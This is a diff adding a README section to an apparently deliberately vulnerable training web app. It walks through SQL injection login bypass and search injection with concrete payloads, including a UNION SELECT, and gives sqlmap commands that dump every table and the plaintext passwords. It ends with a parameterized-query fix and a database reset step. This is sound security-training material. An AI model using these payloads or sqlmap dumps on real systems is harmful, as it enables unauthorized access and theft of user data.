@@ -122,6 +122,203 @@ app.get("/api/orders/:id", async (req, res) => {
 
 ---
 
+## Example Vulnerability: SQL Injection Authentication Bypass
+
+### What is SQL Injection?
+SQL Injection occurs when untrusted user input is inserted into SQL queries without proper sanitisation, allowing attackers to manipulate database queries.
+
+**⚠️ IMPORTANT**: This application now uses a **real SQLite database** with genuinely vulnerable SQL queries (not simulated). All SQL injection testing tools like SQLmap will work authentically!
+
+### How to Test This Vulnerability
+
+#### Method 1: Manual Testing (Easiest)
+
+**Step 1: Navigate to Login Page**
+1. Go to `/login`
+2. Open Browser DevTools (F12) > Console tab to observe any errors
+
+**Step 2: Try Authentication Bypass Payload**
+In the **username** field, enter:
+```
+' OR '1'='1' --
+```
+In the **password** field, enter anything (e.g., `anything`)
+
+Click **Login**
+
+**Expected Result:**
+✅ **Successful Exploit**: You'll be logged in as the first user in the database (usually `admin`), completely bypassing password authentication!
+
+**Why This Works:**
+The vulnerable SQL query looks like:
+```sql
+SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
+```
+
+Breaking it down:
+- `username=''` - Checks if username is empty (false)
+- `OR '1'='1'` - This is always true!
+- `--` - SQL comment, ignores the password check entirely
+
+**Other Payloads to Try:**
+```sql
+admin'--
+' OR 1=1--
+' OR 'a'='a'--
+admin' OR '1'='1
+```
+
+#### Method 2: Using SQLmap (Advanced)
+
+SQLmap is a powerful automated SQL injection tool that can extract entire databases.
+
+**Step 1: Capture Login Request**
+1. Open Burp Suite and configure your browser proxy
+2. Attempt a normal login
+3. Find the POST request to `/api/login`
+4. Right-click > "Copy to file" > Save as `login-request.txt`
+
+**Step 2: Run SQLmap**
+```bash
+# Basic detection
+sqlmap -r login-request.txt --batch --risk=3 --level=5
+
+# Extract all databases
+sqlmap -r login-request.txt --dbs
+
+# Extract tables from current database
+sqlmap -r login-request.txt --tables
+
+# Dump the users table
+sqlmap -r login-request.txt -D main -T users --dump
+
+# Extract all data from database
+sqlmap -r login-request.txt --dump-all
+```
+
+**Alternative: Direct URL Testing**
+```bash
+# Test login endpoint directly
+sqlmap -u "http://localhost:5000/api/login" \
+  --data="username=admin&password=test" \
+  --batch --risk=3 --level=5
+
+# Test product search (also vulnerable)
+sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+  --batch --risk=3 --level=5
+```
+
+**Step 3: Analyse Results**
+SQLmap will:
+- ✅ Detect SQL injection vulnerability
+- ✅ Identify database type (SQLite)
+- ✅ Extract table names
+- ✅ Dump all usernames and **plaintext passwords**!
+- ✅ Extract customer data, orders, products, etc.
+
+**Expected SQLmap Output:**
+```
+[INFO] testing 'SQLite inline queries'
+[INFO] confirming 'SQLite inline queries'
+[INFO] the back-end DBMS is SQLite
+[INFO] fetching tables for database: 'main'
+Database: main
+[6 tables]
++--------------------+
+| users              |
+| products           |
+| orders             |
+| order_items        |
+| reviews            |
+| contact_submissions|
++--------------------+
+
+[INFO] fetching columns for table 'users'
+[INFO] fetching entries for table 'users'
+Database: main
+Table: users
+[7 entries]
++------+----------+----------+-------+
+| id   | username | password | role  |
++------+----------+----------+-------+
+| ...  | admin    | admin123 | admin |
+| ...  | thepubco | welcome123| customer |
+...
+```
+
+### Product Search is Also Vulnerable!
+
+The product search functionality is equally vulnerable:
+
+**Step 1: Go to Products Page**
+Visit `/products` (no login required!)
+
+**Step 2: Try SQL Injection in Search**
+Enter in the search box:
+```
+' OR '1'='1' --
+```
+
+**Expected Result:**
+All products are returned, bypassing search filtering!
+
+**More Sophisticated Payload:**
+```sql
+' UNION SELECT id, 'HACKED' as name, category, price, description, image_url, stock FROM products--
+```
+
+### Why This is Extremely Dangerous
+
+**Real-World Impact:**
+- **Complete database compromise**: Attackers can read, modify, or delete all data
+- **Authentication bypass**: Access any account without passwords
+- **Data exfiltration**: Customer data, orders, financial information exposed
+- **Compliance violations**: GDPR, PCI-DSS breaches
+- **Reputational damage**: Customer trust destroyed
+- **Financial losses**: Fines, lawsuits, business disruption
+
+**OWASP Top 10**: A03:2021 - Injection  
+**CVSS Score**: 9.8 (Critical)
+
+### Remediation: Use Parameterized Queries
+
+**VULNERABLE CODE (Current):**
+```typescript
+// ❌ DANGEROUS: String concatenation
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+const user = db.prepare(query).get();
+```
+
+**SECURE CODE (Recommended Fix):**
+```typescript
+// ✅ SAFE: Parameterized queries
+const query = `SELECT * FROM users WHERE username=? AND password=?`;
+const user = db.prepare(query).get(username, password);
+```
+
+**Additional Security Layers:**
+1. **Input validation**: Whitelist allowed characters
+2. **Least privilege**: Database user shouldn't have DROP/DELETE permissions
+3. **WAF (Web Application Firewall)**: Detect and block SQL injection attempts
+4. **Hashed passwords**: Use bcrypt (plaintext passwords are another vulnerability!)
+5. **Prepared statements**: Always use parameterized queries
+
+### Database Reset Instructions
+
+After heavy SQL injection testing, you may want to reset the database:
+
+**Command:**
+```bash
+tsx server/reset-database.ts
+```
+
+This will:
+- Delete `database.sqlite`
+- Recreate all tables
+- Repopulate with seed data (7 users, 20 products, historical orders)
+
+---
+
 ## All 15 Vulnerabilities to Discover
 
 This application contains 15 intentional security vulnerabilities organized by severity. Use this as a checklist for your penetration test.
